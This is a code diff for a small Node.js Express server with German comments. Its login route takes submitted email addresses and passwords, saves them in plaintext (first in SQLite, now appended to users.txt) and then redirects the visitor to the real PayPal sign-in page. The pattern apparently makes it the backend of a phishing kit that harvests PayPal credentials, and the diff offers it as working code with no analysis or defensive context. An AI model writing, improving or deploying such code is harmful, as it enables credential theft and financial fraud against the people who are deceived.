@@ -1,41 +1,38 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const sqlite3 = require('sqlite3').verbose();
-const path = require('path');
+const express = require("express");
+const bodyParser = require("body-parser");
+const fs = require("fs");
+const path = require("path");
 
 const app = express();
-const db = new sqlite3.Database('users.db');
+const DATA_FILE = path.join(__dirname, "users.txt");
+
+// Stelle sicher, dass die Datei existiert
+if (!fs.existsSync(DATA_FILE)) {
+  fs.writeFileSync(DATA_FILE, "", "utf8");
+}
 
 // Middleware
 app.use(bodyParser.urlencoded({ extended: false }));
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(path.join(__dirname, "public")));
 
-// Initialize DB
-db.serialize(() => {
-  db.run(`CREATE TABLE IF NOT EXISTS users (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    email TEXT NOT NULL,
-    password TEXT NOT NULL
-  )`);
-});
-
-// Routes
-app.post('/login', (req, res) => {
+// Login-Route: schreibt E-Mail und Passwort in users.txt
+app.post("/login", (req, res) => {
   const { email, password } = req.body;
+  const line = `${new Date().toISOString()} | ${email} | ${password}\n`;
 
- // console.log("Test 1 ")
-  db.run('INSERT INTO users (email, password) VALUES (?, ?)', [email, password], function(err) {
+  // Anhängen an die Datei
+  fs.appendFile(DATA_FILE, line, "utf8", (err) => {
     if (err) {
-      console.error(err);
-      return res.status(500).send('Server error');
+      console.error("Fehler beim Schreiben:", err);
+      return res.status(500).send("Serverfehler");
     }
-    //res.send('Login details received. Thank you.');
-    res.redirect('https://www.paypal.com/signin');
+    // Nach dem Speichern weiterleiten
+    res.redirect("https://www.paypal.com/signin");
   });
 });
 
-// Start server
+// Server starten
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Server listening on port ${PORT}`);
+  console.log(`Server läuft auf Port ${PORT}`);
 });
